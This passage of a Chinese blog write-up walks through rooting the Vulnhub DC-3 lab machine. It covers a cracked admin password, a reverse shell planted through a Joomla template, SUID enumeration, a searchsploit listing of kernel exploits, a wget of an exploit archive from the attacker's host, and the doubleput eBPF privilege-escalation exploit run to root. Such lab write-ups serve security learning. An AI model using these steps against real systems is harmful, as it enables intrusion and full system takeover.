class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> DONE <span class=\"hljs-number\">2</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">3</span> (<span class=\"hljs-number\">2024</span><span class=\"hljs-number\">-09</span><span class=\"hljs-number\">-29</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">29</span>) <span class=\"hljs-number\">1.785</span>g<span class=\"hljs-operator\">/</span>s <span class=\"hljs-number\">128.5</span>p<span class=\"hljs-operator\">/</span>s <span class=\"hljs-number\">128.5</span>c<span class=\"hljs-operator\">/</span>s <span class=\"hljs-number\">128.5</span>C<span class=\"hljs-operator\">/</span>s <span class=\"hljs-number\">123456.</span>.wizard\nUse the \"--show\" option <span class=\"hljs-keyword\">to</span> display <span class=\"hljs-keyword\">all</span> <span class=\"hljs-keyword\">of</span> the cracked passwords reliably\nSession completed. \n</code></pre>\n</li>\n<li>\n<p>登陆后台利用</p>\n<ul>\n<li>\n<p>扫描出后台地址<code>/administrator</code> ，登陆</p>\n</li>\n<li>\n<p>利用后台反弹shell</p>\n<p>在模板添加反弹shell代码，然后点击 <code>templates preview</code> ，得到shell</p>\n<p><img src=\"/post-images/VulnhubDC-3/image26.png\" alt=\"image.png\"></p>\n</li>\n</ul>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-sql\">www<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@DC</span><span class=\"hljs-number\">-3</span>:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>www<span class=\"hljs-operator\">/</span>html$ whoami\nwww<span class=\"hljs-operator\">-</span>data\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nwww<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@DC</span><span class=\"hljs-number\">-3</span>:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>www<span class=\"hljs-operator\">/</span>html$ id  \nuid<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">33</span>(www<span class=\"hljs-operator\">-</span>data) gid<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">33</span>(www<span class=\"hljs-operator\">-</span>data) <span class=\"hljs-keyword\">groups</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">33</span>(www<span class=\"hljs-operator\">-</span>data)\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nwww<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@DC</span><span class=\"hljs-number\">-3</span>:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>www<span class=\"hljs-operator\">/</span>html$ uname <span class=\"hljs-operator\">-</span>a\nLinux DC<span class=\"hljs-number\">-3</span> <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">-21</span><span class=\"hljs-operator\">-</span>generic #<span class=\"hljs-number\">37</span><span class=\"hljs-operator\">-</span>Ubuntu SMP Mon Apr <span class=\"hljs-number\">18</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">49</span> UTC <span class=\"hljs-number\">2016</span> i686 i686 i686 GNU<span class=\"hljs-operator\">/</span>Linux\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nwww<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@DC</span><span class=\"hljs-number\">-3</span>:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>www<span class=\"hljs-operator\">/</span>html$ sudo <span class=\"hljs-operator\">-</span>l\nsudo: <span class=\"hljs-keyword\">no</span> tty present <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">no</span> askpass program specified\n</code></pre>\n</li>\n<li>\n<p>信息枚举</p>\n<ul>\n<li>\n<p>查找是否存在suid的权限可执行文件</p>\n<pre><code class=\"hljs language-sql\">www<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@DC</span><span class=\"hljs-number\">-3</span>:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>www<span class=\"hljs-operator\">/</span>html$ find <span class=\"hljs-operator\">/</span> <span class=\"hljs-operator\">-</span>perm <span class=\"hljs-operator\">-</span>u<span class=\"hljs-operator\">=</span>s <span class=\"hljs-operator\">-</span>type f <span class=\"hljs-number\">2</span><span class=\"hljs-operator\">></span><span class=\"hljs-operator\">/</span>dev<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">null</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\n<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>ping6\n<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>ntfs<span class=\"hljs-number\">-3</span>g\n<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>umount\n<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>su\n<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>fusermount\n<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>mount\n<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>ping\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>snapd<span class=\"hljs-operator\">/</span>snap<span class=\"hljs-operator\">-</span>confine\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>policykit<span class=\"hljs-number\">-1</span><span class=\"hljs-operator\">/</span>polkit<span class=\"hljs-operator\">-</span>agent<span class=\"hljs-operator\">-</span>helper<span class=\"hljs-number\">-1</span>\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>i386<span class=\"hljs-operator\">-</span>linux<span class=\"hljs-operator\">-</span>gnu<span class=\"hljs-operator\">/</span>lxc<span class=\"hljs-operator\">/</span>lxc<span class=\"hljs-operator\">-</span><span class=\"hljs-keyword\">user</span><span class=\"hljs-operator\">-</span>nic\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>openssh<span class=\"hljs-operator\">/</span>ssh<span class=\"hljs-operator\">-</span>keysign\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>dbus<span class=\"hljs-number\">-1.0</span><span class=\"hljs-operator\">/</span>dbus<span class=\"hljs-operator\">-</span>daemon<span class=\"hljs-operator\">-</span>launch<span class=\"hljs-operator\">-</span>helper\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>eject<span class=\"hljs-operator\">/</span>dmcrypt<span class=\"hljs-operator\">-</span><span class=\"hljs-keyword\">get</span><span class=\"hljs-operator\">-</span>device\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>passwd\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>newgidmap\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>gpasswd\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sudo\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>pkexec\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>chsh\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>chfn\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>newuidmap\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>newgrp\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">at</span>\n</code></pre>\n</li>\n<li>\n<p>查找数据库配置文件，在当前目录下<code>configuration.php</code> ,得到数据库用户密码</p>\n<p>账号 root 密码 squires</p>\n<p>但是登陆不成功</p>\n</li>\n<li>\n<p>搜索内核本地权限提升漏洞</p>\n<pre><code class=\"hljs language-sql\">searchsploit Ubuntu <span class=\"hljs-number\">16.04</span>      \n<span class=\"hljs-comment\">------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------</span>\n Exploit Title                                                                                                                                        <span class=\"hljs-operator\">|</span>  Path\n<span class=\"hljs-comment\">------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------</span>\nApport <span class=\"hljs-number\">2.</span>x (Ubuntu Desktop <span class=\"hljs-number\">12.10</span> <span class=\"hljs-operator\">&#x3C;</span> <span class=\"hljs-number\">16.04</span>) <span class=\"hljs-operator\">-</span> <span class=\"hljs-keyword\">Local</span> Code Execution                                                                                      <span class=\"hljs-operator\">|</span> linux<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">40937.</span>txt\nExim <span class=\"hljs-number\">4</span> (Debian <span class=\"hljs-number\">8</span> <span class=\"hljs-operator\">/</span> Ubuntu <span class=\"hljs-number\">16.04</span>) <span class=\"hljs-operator\">-</span> Spool Privilege Escalation                                                                                         <span class=\"hljs-operator\">|</span> linux<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">40054.</span>c\nGoogle Chrome (Fedora <span class=\"hljs-number\">25</span> <span class=\"hljs-operator\">/</span> Ubuntu <span class=\"hljs-number\">16.04</span>) <span class=\"hljs-operator\">-</span> <span class=\"hljs-string\">'tracker-extract'</span> <span class=\"hljs-operator\">/</span> <span class=\"hljs-string\">'gnome-video-thumbnailer'</span> <span class=\"hljs-operator\">+</span> <span class=\"hljs-string\">'totem'</span> Drive<span class=\"hljs-operator\">-</span><span class=\"hljs-keyword\">By</span> Download                                  <span class=\"hljs-operator\">|</span> linux<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">40943.</span>txt\nLightDM (Ubuntu <span class=\"hljs-number\">16.04</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">16.10</span>) <span class=\"hljs-operator\">-</span> <span class=\"hljs-string\">'Guest Account'</span> <span class=\"hljs-keyword\">Local</span> Privilege Escalation                                                                             <span class=\"hljs-operator\">|</span> linux<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">41923.</span>txt\nLinux Kernel (Debian <span class=\"hljs-number\">7.7</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">8.5</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">9.0</span> <span class=\"hljs-operator\">/</span> Ubuntu <span class=\"hljs-number\">14.04</span><span class=\"hljs-number\">.2</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">16.04</span><span class=\"hljs-number\">.2</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">17.04</span> <span class=\"hljs-operator\">/</span> Fedora <span class=\"hljs-number\">22</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">25</span> <span class=\"hljs-operator\">/</span> CentOS <span class=\"hljs-number\">7.3</span><span class=\"hljs-number\">.1611</span>) <span class=\"hljs-operator\">-</span> <span class=\"hljs-string\">'ldso_hwcap_64 Stack Clash'</span> <span class=\"hljs-keyword\">Local</span> Privilege Escal <span class=\"hljs-operator\">|</span> linux_x86<span class=\"hljs-number\">-64</span><span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">42275.</span>c\nLinux Kernel (Debian <span class=\"hljs-number\">9</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">10</span> <span class=\"hljs-operator\">/</span> Ubuntu <span class=\"hljs-number\">14.04</span><span class=\"hljs-number\">.5</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">16.04</span><span class=\"hljs-number\">.2</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">17.04</span> <span class=\"hljs-operator\">/</span> Fedora <span class=\"hljs-number\">23</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">24</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">25</span>) <span class=\"hljs-operator\">-</span> <span class=\"hljs-string\">'ldso_dynamic Stack Clash'</span> <span class=\"hljs-keyword\">Local</span> Privilege Escalation                   <span class=\"hljs-operator\">|</span> linux_x86<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">42276.</span>c\nLinux Kernel (Ubuntu <span class=\"hljs-number\">16.04</span>) <span class=\"hljs-operator\">-</span> Reference Count Overflow <span class=\"hljs-keyword\">Using</span> BPF Maps                                                                                 <span class=\"hljs-operator\">|</span> linux<span class=\"hljs-operator\">/</span>dos<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">39773.</span>txt\nLinux Kernel <span class=\"hljs-number\">4.14</span><span class=\"hljs-number\">.7</span> (Ubuntu <span class=\"hljs-number\">16.04</span> <span class=\"hljs-operator\">/</span> CentOS <span class=\"hljs-number\">7</span>) <span class=\"hljs-operator\">-</span> (KASLR <span class=\"hljs-operator\">&#x26;</span> SMEP Bypass) Arbitrary File Read                                                             <span class=\"hljs-operator\">|</span> linux<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">45175.</span>c\nLinux Kernel <span class=\"hljs-number\">4.4</span> (Ubuntu <span class=\"hljs-number\">16.04</span>) <span class=\"hljs-operator\">-</span> <span class=\"hljs-string\">'BPF'</span> <span class=\"hljs-keyword\">Local</span> Privilege Escalation (Metasploit)                                                                       <span class=\"hljs-operator\">|</span> linux<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">40759.</span>rb\nLinux Kernel <span class=\"hljs-number\">4.4</span> (Ubuntu <span class=\"hljs-number\">16.04</span>) <span class=\"hljs-operator\">-</span> <span class=\"hljs-string\">'snd_timer_user_ccallback()'</span> Kernel Pointer Leak                                                                    <span class=\"hljs-operator\">|</span> linux<span class=\"hljs-operator\">/</span>dos<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">46529.</span>c\nLinux Kernel <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span> (Ubuntu <span class=\"hljs-number\">14.04</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">16.04</span> x86<span class=\"hljs-number\">-64</span>) <span class=\"hljs-operator\">-</span> <span class=\"hljs-string\">'AF_PACKET'</span> Race <span class=\"hljs-keyword\">Condition</span> Privilege Escalation                                                      <span class=\"hljs-operator\">|</span> linux_x86<span class=\"hljs-number\">-64</span><span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">40871.</span>c\nLinux Kernel <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">-21</span> (Ubuntu <span class=\"hljs-number\">16.04</span> x64) <span class=\"hljs-operator\">-</span> Netfilter <span class=\"hljs-string\">'target_offset'</span> <span class=\"hljs-keyword\">Out</span><span class=\"hljs-operator\">-</span><span class=\"hljs-keyword\">of</span><span class=\"hljs-operator\">-</span>Bounds Privilege Escalation                                               <span class=\"hljs-operator\">|</span> linux_x86<span class=\"hljs-number\">-64</span><span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">40049.</span>c\nLinux Kernel <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">-21</span> <span class=\"hljs-operator\">&#x3C;</span> <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">-51</span> (Ubuntu <span class=\"hljs-number\">14.04</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">16.04</span> x64) <span class=\"hljs-operator\">-</span> <span class=\"hljs-string\">'AF_PACKET'</span> Race <span class=\"hljs-keyword\">Condition</span> Privilege Escalation                                           <span class=\"hljs-operator\">|</span> windows_x86<span class=\"hljs-number\">-64</span><span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">47170.</span>c\nLinux Kernel <span class=\"hljs-number\">4.4</span>.x (Ubuntu <span class=\"hljs-number\">16.04</span>) <span class=\"hljs-operator\">-</span> <span class=\"hljs-string\">'double-fdput()'</span> bpf(BPF_PROG_LOAD) Privilege Escalation                                                          <span class=\"hljs-operator\">|</span> linux<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">39772.</span>txt\nLinux Kernel <span class=\"hljs-number\">4.6</span><span class=\"hljs-number\">.2</span> (Ubuntu <span class=\"hljs-number\">16.04</span><span class=\"hljs-number\">.1</span>) <span class=\"hljs-operator\">-</span> <span class=\"hljs-string\">'IP6T_SO_SET_REPLACE'</span> <span class=\"hljs-keyword\">Local</span> Privilege Escalation                                                                <span class=\"hljs-operator\">|</span> linux<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">40489.</span>txt\nLinux Kernel <span class=\"hljs-number\">4.8</span> (Ubuntu <span class=\"hljs-number\">16.04</span>) <span class=\"hljs-operator\">-</span> Leak sctp Kernel Pointer                                                                                            <span class=\"hljs-operator\">|</span> linux<span class=\"hljs-operator\">/</span>dos<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">45919.</span>c\nLinux Kernel <span class=\"hljs-operator\">&#x3C;</span> <span class=\"hljs-number\">4.13</span><span class=\"hljs-number\">.9</span> (Ubuntu <span class=\"hljs-number\">16.04</span> <span class=\"hljs-operator\">/</span> Fedora <span class=\"hljs-number\">27</span>) <span class=\"hljs-operator\">-</span> <span class=\"hljs-keyword\">Local</span> Privilege Escalation                                                                         <span class=\"hljs-operator\">|</span> linux<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">45010.</span>c\nLinux Kernel <span class=\"hljs-operator\">&#x3C;</span> <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">-116</span> (Ubuntu <span class=\"hljs-number\">16.04</span><span class=\"hljs-number\">.4</span>) <span class=\"hljs-operator\">-</span> <span class=\"hljs-keyword\">Local</span> Privilege Escalation                                                                                <span class=\"hljs-operator\">|</span> linux<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">44298.</span>c\nLinux Kernel <span class=\"hljs-operator\">&#x3C;</span> <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">-21</span> (Ubuntu <span class=\"hljs-number\">16.04</span> x64) <span class=\"hljs-operator\">-</span> <span class=\"hljs-string\">'netfilter target_offset'</span> <span class=\"hljs-keyword\">Local</span> Privilege Escalation                                                     <span class=\"hljs-operator\">|</span> linux_x86<span class=\"hljs-number\">-64</span><span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">44300.</span>c\nLinux Kernel <span class=\"hljs-operator\">&#x3C;</span> <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">-83</span> <span class=\"hljs-operator\">/</span> <span class=\"hljs-operator\">&#x3C;</span> <span class=\"hljs-number\">4.8</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">-58</span> (Ubuntu <span class=\"hljs-number\">14.04</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">16.04</span>) <span class=\"hljs-operator\">-</span> <span class=\"hljs-keyword\">Local</span> Privilege Escalation (KASLR <span class=\"hljs-operator\">/</span> SMEP)                                                 <span class=\"hljs-operator\">|</span> linux<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">43418.</span>c\nLinux Kernel <span class=\"hljs-operator\">&#x3C;</span> <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span><span class=\"hljs-operator\">/</span> <span class=\"hljs-operator\">&#x3C;</span> <span class=\"hljs-number\">4.8</span><span class=\"hljs-number\">.0</span> (Ubuntu <span class=\"hljs-number\">14.04</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">16.04</span> <span class=\"hljs-operator\">/</span> Linux Mint <span class=\"hljs-number\">17</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">18</span> <span class=\"hljs-operator\">/</span> Zorin) <span class=\"hljs-operator\">-</span> <span class=\"hljs-keyword\">Local</span> Privilege Escalation (KASLR <span class=\"hljs-operator\">/</span> SMEP)                             <span class=\"hljs-operator\">|</span> linux<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">local</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">47169.</span>c\n<span class=\"hljs-comment\">------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------</span>\n</code></pre>\n<p>拉取 <code>39772.txt</code> （因为版本号等对的上） ,查看里面存在exp地址，里面存在文件以及操作方法</p>\n<blockquote>\n<p><a href=\"https://project-zero.issues.chromium.org/issues/42452340\">https://project-zero.issues.chromium.org/issues/42452340</a></p>\n</blockquote>\n<p>下载<code>exp.zip</code>，开启临时服务器供靶机下载</p>\n<pre><code class=\"hljs language-sql\">www<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@DC</span><span class=\"hljs-number\">-3</span>:<span class=\"hljs-operator\">/</span>tmp$ wget http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span><span class=\"hljs-operator\">/</span>exploit.tar\nwget http:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span><span class=\"hljs-operator\">/</span>exploit.tar\n<span class=\"hljs-comment\">--2024-09-29 18:13:43--  http://192.168.75.151/exploit.tar</span>\nConnecting <span class=\"hljs-keyword\">to</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>:<span class=\"hljs-number\">80.</span>.. connected.\nHTTP request sent, awaiting response... <span class=\"hljs-number\">200</span> OK\nLength: <span class=\"hljs-number\">20480</span> (<span class=\"hljs-number\">20</span>K) [application<span class=\"hljs-operator\">/</span>x<span class=\"hljs-operator\">-</span>tar]\nSaving <span class=\"hljs-keyword\">to</span>: <span class=\"hljs-string\">'exploit.tar'</span>\n\n     <span class=\"hljs-number\">0</span>K .......... ..........                                 <span class=\"hljs-number\">100</span><span class=\"hljs-operator\">%</span> <span class=\"hljs-number\">76.0</span>M<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">0</span>s\n\n<span class=\"hljs-number\">2024</span><span class=\"hljs-number\">-09</span><span class=\"hljs-number\">-29</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">43</span> (<span class=\"hljs-number\">76.0</span> MB<span class=\"hljs-operator\">/</span>s) <span class=\"hljs-operator\">-</span> <span class=\"hljs-string\">'exploit.tar'</span> saved [<span class=\"hljs-number\">20480</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">20480</span>]\n</code></pre>\n<p>靶机下载后解压，先运行<code>./compile.sh</code> 再运行<code>./doubleput</code> 即可获得root权限</p>\n<pre><code class=\"hljs language-sql\">www<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@DC</span><span class=\"hljs-number\">-3</span>:<span class=\"hljs-operator\">/</span>tmp<span class=\"hljs-operator\">/</span>ebpf_mapfd_doubleput_exploit$ .<span class=\"hljs-operator\">/</span>compile.sh\ndoubleput.c: <span class=\"hljs-keyword\">In</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-string\">'make_setuid'</span>:\ndoubleput.c:<span class=\"hljs-number\">91</span>:<span class=\"hljs-number\">13</span>: warning: cast <span class=\"hljs-keyword\">from</span> pointer <span class=\"hljs-keyword\">to</span> <span class=\"hljs-type\">integer</span> <span class=\"hljs-keyword\">of</span> different size [<span class=\"hljs-operator\">-</span>Wpointer<span class=\"hljs-operator\">-</span><span class=\"hljs-keyword\">to</span><span class=\"hljs-operator\">-</span><span class=\"hljs-type\">int</span><span class=\"hljs-operator\">-</span>cast]\n    .insns <span class=\"hljs-operator\">=</span> (__aligned_u64) insns,\n             <span class=\"hljs-operator\">^</span>\ndoubleput.c:<span class=\"hljs-number\">92</span>:<span class=\"hljs-number\">15</span>: warning: cast <span class=\"hljs-keyword\">from</span> pointer <span class=\"hljs-keyword\">to</span> <span class=\"hljs-type\">integer</span> <span class=\"hljs-keyword\">of</span> different size [<span class=\"hljs-operator\">-</span>Wpointer<span class=\"hljs-operator\">-</span><span class=\"hljs-keyword\">to</span><span class=\"hljs-operator\">-</span><span class=\"hljs-type\">int</span><span class=\"hljs-operator\">-</span>cast]\n    .license <span class=\"hljs-operator\">=</span> (__aligned_u64)\"\"\n               <span class=\"hljs-operator\">^</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>              \nwww<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@DC</span><span class=\"hljs-number\">-3</span>:<span class=\"hljs-operator\">/</span>tmp<span class=\"hljs-operator\">/</span>ebpf_mapfd_doubleput_exploit$ .<span class=\"hljs-operator\">/</span>doubleput\nstarting writev\nwoohoo, got pointer reuse\nwritev returned successfully. if this worked, you<span class=\"hljs-string\">'ll have a root shell in &#x3C;=60 seconds.\nsuid file detected, launching rootshell...\nwe have root privs now...\nid\nuid=0(root) gid=0(root) groups=0(root),33(www-data)\nwhoami\nroot\n</span></code></pre>\n</li>\n<li>\n<p>读取<code>flag</code>文件</p>\n<pre><code class=\"hljs language-sql\">root<span class=\"hljs-variable\">@DC</span><span class=\"hljs-number\">-3</span>:<span class=\"hljs-operator\">/</span>root# cat the<span class=\"hljs-operator\">-</span>flag.txt\ncat the<span class=\"hljs-operator\">-</span>flag.txt\n __        __   _ _   ____                   _ _ _ _ \n \\ \\      <span class=\"hljs-operator\">/</span> <span class=\"hljs-operator\">/</span>__<span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span>  _ \\  ___  _ __   ___<span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span>\n  \\ \\ <span class=\"hljs-operator\">/</span>\\ <span class=\"hljs-operator\">/</span> <span class=\"hljs-operator\">/</span> _ \\ <span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">|</span><span class=\"hljs-operator\">/</span> _ \\<span class=\"hljs-operator\">|</span> <span class=\"hljs-string\">'_ \\ / _ \\ | | | |\n   \\ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|\n    \\_/\\_/ \\___|_|_| |____/ \\___/|_| |_|\\___(_|_|_|_)\n                                                     \n\nCongratulations are in order.  :-)\n\nI hope you'</span>ve enjoyed this challenge <span class=\"hljs-keyword\">as</span> I enjoyed making it.\n\nIf there <span class=\"hljs-keyword\">are</span> <span class=\"hljs-keyword\">any</span> ways that I can improve these little challenges,\nplease let me know.\n\n<span class=\"hljs-keyword\">As</span> <span class=\"hljs-keyword\">per</span> usual, comments <span class=\"hljs-keyword\">and</span> complaints can be sent via Twitter <span class=\"hljs-keyword\">to</span> <span class=\"hljs-variable\">@DCAU7</span>\n\nHave a great <span class=\"hljs-keyword\">day</span><span class=\"hljs-operator\">!</span><span class=\"hljs-operator\">!</span><span class=\"hljs-operator\">!</span><span class=\"hljs-operator\">!</span>\n</code></pre>\n</li>\n</ul>\n</li>\n</ol>","title":"Vulnhub - DC-3","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"DC-3\n\n \n \n\n主机发现端口扫描\n\n1. 使用nmap扫描网段类存活主机\n    \n    因为靶机是我最后添加的，所以靶机IP是`158`\n    \n    \n    \n2. 扫描主机开放端口\n    \n    \n    \n3. 扫描主机服务版本以及系统版本\n    \n    \n    \n4. 扫描漏洞\n    \n    \n    \n    疑似`CSRF` ，并且扫描出CMS是`Joom..."},"recentPosts":[{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Season8 - Voleur","date":"2025-07-07","isEncrypted":true,"year":"2025","month":"07","day":"07"},{"id":"TryHackMeCreative","title":"TryHackMe - Creative","date":"2025-07-05","isEncrypted":false,"year":"2025","month":"07","day":"05"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Season8 - 